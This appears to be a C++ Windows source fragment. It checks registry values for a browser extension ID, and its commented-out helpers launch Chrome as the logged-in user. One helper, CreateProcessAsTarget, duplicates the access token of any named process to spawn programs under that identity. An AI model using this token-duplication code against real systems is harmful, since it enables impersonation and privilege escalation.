bool CheckReadRegistryValues(HKEY hKeyRoot, const std::string subKey, std::string p_ExtensionID) {

	bool    w_bRtn = false;
	HKEY hKey;
	LONG result = RegOpenKeyExA(hKeyRoot, subKey.c_str(), 0, KEY_READ, &hKey);

	if (result == ERROR_SUCCESS) {
		DWORD index = 0;
		char valueName[256];
		DWORD valueNameSize;
		BYTE data[1024];
		DWORD dataSize;
		DWORD type;

		while (true) {
			valueNameSize = sizeof(valueName) / sizeof(char);
			dataSize = sizeof(data);

			// Enumerate registry values
			result = RegEnumValueA(hKey, index, valueName, &valueNameSize, NULL, &type, data, &dataSize);

			if (result == ERROR_NO_MORE_ITEMS) {
				break; // No more values to enumerate
			}

			if (result == ERROR_SUCCESS && type == REG_SZ) { // Ensure the value is of type string (REG_SZ)
				std::string w_ValueData = reinterpret_cast<char*>(data);

				if (w_ValueData.find(p_ExtensionID.c_str()) != std::string::npos) {
					w_bRtn = true;
					break;
				}

			}

			index++;
		}

		RegCloseKey(hKey);
	}
	else {
	}

	return w_bRtn;
}
//
//// Function to enable a specific privilege in the token
//bool EnablePrivilege(HANDLE hToken, LPCWSTR privilege) {
//	TOKEN_PRIVILEGES tp;
//	LUID luid;
//
//	if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
//		std::cerr << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
//		return false;
//	}
//
//	tp.PrivilegeCount = 1;
//	tp.Privileges[0].Luid = luid;
//	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
//
//	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
//		std::cerr << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
//		return false;
//	}
//
//	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
//		std::cerr << "The token does not have the specified privilege." << std::endl;
//		return false;
//	}
//
//	return true;
//}
//
//// Function to run Chrome as the logged-in user
//bool RunChromeAsLoggedInUser() {
//	DWORD sessionId = WTSGetActiveConsoleSessionId();
//	if (sessionId == 0xFFFFFFFF) {
//		std::cerr << "No active user session found." << std::endl;
//		return false;
//	}
//
//	HANDLE hToken;
//	if (!WTSQueryUserToken(sessionId, &hToken)) {
//		std::cerr << "WTSQueryUserToken failed: " << GetLastError() << std::endl;
//		return false;
//	}
//
//	HANDLE hDupToken;
//	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
//		std::cerr << "DuplicateTokenEx failed: " << GetLastError() << std::endl;
//		CloseHandle(hToken);
//		return false;
//	}
//	CloseHandle(hToken);
//
//	// Enable necessary privileges for the duplicated token
//	if (!EnablePrivilege(hDupToken, SE_ASSIGNPRIMARYTOKEN_NAME) || !EnablePrivilege(hDupToken, SE_INCREASE_QUOTA_NAME)) {
//		std::cerr << "Failed to enable required privileges." << std::endl;
//		CloseHandle(hDupToken);
//		return false;
//	}
//
//	// Create the environment block for the new process
//	LPVOID lpEnvironment = NULL;
//	if (!CreateEnvironmentBlock(&lpEnvironment, hDupToken, FALSE)) {
//		std::cerr << "CreateEnvironmentBlock failed: " << GetLastError() << std::endl;
//		CloseHandle(hDupToken);
//		return false;
//	}
//
//	STARTUPINFOW si = { sizeof(STARTUPINFOW) };
//	PROCESS_INFORMATION pi = { 0 };
//	si.lpDesktop = (LPWSTR)L"winsta0\\default"; // To interact with the user's desktop
//
//	// Launch chrome.exe using the duplicated token
//	if (!CreateProcessAsUserW(
//		hDupToken,                   // User token
//		L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", // Path to chrome.exe
//		NULL,                        // Command line arguments
//		NULL,                        // Process handle not inheritable
//		NULL,                        // Thread handle not inheritable
//		FALSE,                       // Don't inherit handles
//		CREATE_UNICODE_ENVIRONMENT,  // Creation flags
//		lpEnvironment,               // Environment block
//		NULL,                        // Current directory
//		&si,                         // Startup information
//		&pi                          // Process information
//	)) {
//		std::cerr << "CreateProcessAsUser failed: " << GetLastError() << std::endl;
//		DestroyEnvironmentBlock(lpEnvironment);
//		CloseHandle(hDupToken);
//		return false;
//	}
//
//	// Clean up
//	CloseHandle(pi.hProcess);
//	CloseHandle(pi.hThread);
//	DestroyEnvironmentBlock(lpEnvironment);
//	CloseHandle(hDupToken);
//
//	std::cout << "Chrome launched successfully as the logged-in user." << std::endl;
//	return true;
//}



//
//
//
//
//void InitStartupInfo(STARTUPINFOW& si) {
//	ZeroMemory(&si, sizeof(si));
//	si.cb = sizeof(si);
//	si.dwFlags = STARTF_USESHOWWINDOW;
//	si.wShowWindow = SW_SHOW;
//}
//
//
//bool _GetProcessToken(HANDLE& hToken, const wchar_t* p_wszTarget) {
//	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//	if (hProcessSnap == INVALID_HANDLE_VALUE || hProcessSnap == NULL) {
//		return false;
//	}
//
//	PROCESSENTRY32 pe32;
//	pe32.dwSize = sizeof(PROCESSENTRY32);
//
//	if (!Process32First(hProcessSnap, &pe32)) {
//		CloseHandle(hProcessSnap);
//		return false;
//	}
//
//	do {
//		if (_wcsicmp(pe32.szExeFile, p_wszTarget) == 0) {
//			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
//			if (hProcess == NULL) {
//				CloseHandle(hProcessSnap);
//				return false;
//			}
//
//			if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
//				CloseHandle(hProcess);
//				CloseHandle(hProcessSnap);
//				return false;
//			}
//
//			CloseHandle(hProcess);
//			break;
//		}
//	} while (Process32Next(hProcessSnap, &pe32));
//
//	CloseHandle(hProcessSnap);
//	return true;
//}
//
//unsigned long CreateProcessAsTarget(
//	const wchar_t* p_wszTarget,
//	const wchar_t* p_wszPath,
//	const wchar_t* p_wszCmd,
//	const wchar_t* p_wszWorkDir,
//	DWORD p_dwCreateFlag,
//	LPSTARTUPINFOW p_pSI,
//	LPPROCESS_INFORMATION p_pPI
//)
//{
//	HANDLE hToken;
//	if (!_GetProcessToken(hToken, p_wszTarget)) {
//		return -1;
//	}
//
//	HANDLE hNewToken;
//	if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
//		//		std::cerr << "DuplicateTokenEx failed: " << GetLastError() << '\n';
//		CloseHandle(hToken);
//		return -1;
//	}
//
//	if (!CreateProcessAsUserW(hNewToken, p_wszPath, (LPWSTR)p_wszCmd, NULL, NULL, FALSE, p_dwCreateFlag, NULL, p_wszWorkDir, p_pSI, p_pPI)) {
//		//		std::cerr << "CreateProcessAsUser failed: " << GetLastError() << '\n';
//		CloseHandle(hNewToken);
//		CloseHandle(hToken);
//		return -1;
//	}
//
//	CloseHandle(hNewToken);
//	CloseHandle(hToken);
//	return 0;
//}